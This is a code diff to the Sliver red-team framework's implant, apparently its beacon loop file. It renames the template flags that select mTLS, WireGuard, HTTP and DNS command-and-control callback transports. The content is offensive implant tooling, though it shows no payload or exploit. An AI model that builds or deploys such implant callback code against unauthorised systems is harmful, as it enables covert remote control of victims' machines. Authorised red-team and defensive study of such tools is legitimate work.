@@ -30,18 +30,18 @@ import (
 	"net/url"
 	"time"
 
-	// {{if .Config.IncludeMTLS}}
+	// {{if .Config.MTLSc2Enabled}}
 	"crypto/tls"
 
 	"github.com/bishopfox/sliver/implant/sliver/transports/mtls"
 
 	// {{end}}
 
-	// {{if .Config.IncludeHTTP}}
+	// {{if .Config.HTTPc2Enabled}}
 	"github.com/bishopfox/sliver/implant/sliver/transports/httpclient"
 	// {{end}}
 
-	// {{if .Config.IncludeWG}}
+	// {{if .Config.WGc2Enabled}}
 	"errors"
 	"net"
 
@@ -50,11 +50,11 @@ import (
 
 	// {{end}}
 
-	// {{if or .Config.IncludeMTLS .Config.IncludeWG}}
+	// {{if or .Config.MTLSc2Enabled .Config.WGc2Enabled}}
 	"strconv"
 	// {{end}}
 
-	// {{if .Config.IncludeDNS}}
+	// {{if .Config.DNSc2Enabled}}
 
 	"github.com/bishopfox/sliver/implant/sliver/transports/dnsclient"
 	// {{end}}
@@ -141,28 +141,28 @@ func StartBeaconLoop(abort <-chan struct{}) <-chan *Beacon {
 			switch uri.Scheme {
 
 			// *** MTLS ***
-			// {{if .Config.IncludeMTLS}}
+			// {{if .Config.MTLSc2Enabled}}
 			case "mtls":
 				beacon = mtlsBeacon(uri)
-				// {{end}}  - IncludeMTLS
+				// {{end}}  - MTLSc2Enabled
 			case "wg":
 				// *** WG ***
-				// {{if .Config.IncludeWG}}
+				// {{if .Config.WGc2Enabled}}
 				beacon = wgBeacon(uri)
-				// {{end}}  - IncludeWG
+				// {{end}}  - WGc2Enabled
 			case "https":
 				fallthrough
 			case "http":
 				// *** HTTP ***
-				// {{if .Config.IncludeHTTP}}
+				// {{if .Config.HTTPc2Enabled}}
 				beacon = httpBeacon(uri)
-				// {{end}} - IncludeHTTP
+				// {{end}} - HTTPc2Enabled
 
 			case "dns":
 				// *** DNS ***
-				// {{if .Config.IncludeDNS}}
+				// {{if .Config.DNSc2Enabled}}
 				beacon = dnsBeacon(uri)
-				// {{end}} - IncludeDNS
+				// {{end}} - DNSc2Enabled
 
 			default:
 				// {{if .Config.Debug}}
@@ -180,7 +180,7 @@ func StartBeaconLoop(abort <-chan struct{}) <-chan *Beacon {
 	return nextBeacon
 }
 
-// {{if .Config.IncludeMTLS}}
+// {{if .Config.MTLSc2Enabled}}
 func mtlsBeacon(uri *url.URL) *Beacon {
 	// {{if .Config.Debug}}
 	log.Printf("Beacon -> %s", uri.String())
@@ -230,7 +230,7 @@ func mtlsBeacon(uri *url.URL) *Beacon {
 
 // {{end}}
 
-// {{if .Config.IncludeWG}}
+// {{if .Config.WGc2Enabled}}
 func wgBeacon(uri *url.URL) *Beacon {
 	// {{if .Config.Debug}}
 	log.Printf("Establishing Beacon -> %s", uri.String())
@@ -290,7 +290,7 @@ func wgBeacon(uri *url.URL) *Beacon {
 
 // {{end}}
 
-// {{if .Config.IncludeHTTP}}
+// {{if .Config.HTTPc2Enabled}}
 func httpBeacon(uri *url.URL) *Beacon {
 
 	// {{if .Config.Debug}}
@@ -335,7 +335,7 @@ func httpBeacon(uri *url.URL) *Beacon {
 
 // {{end}}
 
-// {{if .Config.IncludeDNS}}
+// {{if .Config.DNSc2Enabled}}
 func dnsBeacon(uri *url.URL) *Beacon {
 	var client *dnsclient.SliverDNSClient
 	var err error
@@ -371,6 +371,6 @@ func dnsBeacon(uri *url.URL) *Beacon {
 	return beacon
 }
 
-// {{end}} - IncludeDNS
+// {{end}} - DNSc2Enabled
 
 // {{end}} - IsBeacon
